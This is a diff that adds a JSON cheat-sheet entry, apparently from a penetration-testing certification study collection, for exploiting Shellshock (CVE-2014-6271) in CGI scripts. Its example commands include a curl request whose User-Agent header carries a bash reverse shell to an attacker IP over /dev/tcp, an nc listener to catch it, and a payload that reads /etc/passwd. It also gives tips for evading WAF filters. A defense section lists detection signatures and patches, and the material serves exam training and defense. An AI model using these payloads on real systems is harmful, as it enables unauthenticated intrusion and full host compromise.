@@ -1,0 +1,97 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "curl"
+  ],
+  "tags": [
+    "shellshock",
+    "cgi",
+    "rce",
+    "cve"
+  ],
+  "category": "Exploitation",
+  "subcategory": "CGI Applications",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Enumerate CGI scripts with gobuster",
+      "command": "gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi"
+    },
+    {
+      "label": "Shellshock reverse-shell payload in the User-Agent header",
+      "command": "curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.17.198/7777 0>&1' http://10.129.57.124/cgi-bin/access.cgi"
+    },
+    {
+      "label": "Catch the shell on a listener",
+      "command": "sudo nc -lvnp 7777"
+    }
+  ],
+  "notes": "The payload goes in a header (User-Agent/Cookie) that the CGI script exports into the environment - () { :; }; is the Bash function trick. Any reachable .cgi/.sh under cgi-bin is a candidate.",
+  "references": [
+    {
+      "title": "Shellshock (CVE-2014-6271)",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "tomcat-cgi-injection",
+      "note": "The other classic CGI attack (Windows .bat injection).",
+      "rel": "alternative"
+    },
+    {
+      "id": "coreftp-path-traversal",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "shellshock",
+  "name": "Shellshock - CGI RCE (CVE-2014-6271)",
+  "command": "curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://<ip>/cgi-bin/<script>.cgi",
+  "description": "Bash Shellshock: CGI scripts export request headers into environment variables, so a crafted User-Agent with a function-definition prefix executes trailing commands. Swap the command for a reverse shell.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190",
+    "T1059.004"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Shellshock (CVE-2014-6271) exploits bash's environment variable handling. HTTP headers (User-Agent, Cookie) containing a bash function definition followed by commands are passed to CGI scripts, causing bash to execute the appended commands during initialization.",
+    "prerequisites": "Web server running CGI scripts executed by unpatched bash (< 4.3.25). CGI path (/cgi-bin/) publicly accessible. No WAF filtering malicious header patterns.",
+    "impact": "Unauthenticated RCE as www-data. Webshell deployment, reverse shell, and full host compromise from a single crafted HTTP request.",
+    "detection": "HTTP requests with '() { :; };' pattern in User-Agent/Cookie/Referer headers. IDS Shellshock signatures (Snort SID 2018486+). WAF alert for bash function body pattern.",
+    "artifacts": "Web server access log (Shellshock payload in User-Agent) | IDS/WAF alert (Shellshock signature) | Process log: bash spawned from apache with unexpected commands",
+    "prevention": "Update bash to 4.3.25+. Replace CGI bash scripts with non-bash alternatives (Python, Perl). Remove CGI if not required. Deploy WAF with Shellshock signatures.",
+    "misconfiguration": "Web server runs CGI scripts executed by unpatched bash. /cgi-bin/ publicly accessible. HTTP headers passed as environment variables to CGI scripts (standard CGI behavior).",
+    "vulnerable_config": "# Unpatched bash: GNU bash, version 4.3.0(1)\n# Apache httpd.conf -- CGI enabled\nScriptAlias /cgi-bin/ \"/var/www/cgi-bin/\"\n<Directory \"/var/www/cgi-bin\">\n  Options +ExecCGI\n  AddHandler cgi-script .cgi .sh\n</Directory>",
+    "secure_config": "# Update bash\napt-get install --only-upgrade bash\nbash --version  # confirm >= 4.3.25\n# Remove CGI if not needed\na2dismod cgi\n# ModSecurity Shellshock rule\nSecRule REQUEST_HEADERS \"\\(\\s*\\)\\s*\\{\" \"deny,status:400\"",
+    "evasion": "Use Cookie, Referer, or custom headers if User-Agent is filtered. Slight variations: '() { ignored; }; command'.",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "MITRE T1059",
+      "OWASP A06:2021"
+    ]
+  }
+}
